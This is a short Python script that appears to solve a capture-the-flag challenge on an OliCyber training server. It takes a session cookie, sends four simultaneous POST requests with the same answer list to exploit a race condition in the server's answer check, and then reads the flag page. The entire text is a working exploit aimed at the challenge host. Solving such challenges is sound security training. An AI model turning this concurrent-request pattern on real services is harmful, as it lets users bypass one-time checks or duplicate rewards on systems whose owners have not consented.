from requests import session
from threading import Thread

url = 'http://invalsi.challs.olicyber.it/'

headers = {'Content-Type': 'application/json'}

s = session()

s.get(url) # get cookie

# race condition
def make_request():
    s.post(url, headers=headers, json=["1", "2", "3"])

threads = [Thread(target=make_request) for _ in range(4)]

for thread in threads:
    thread.start()

for thread in threads:
    thread.join()

print(s.get(url + 'flag').text)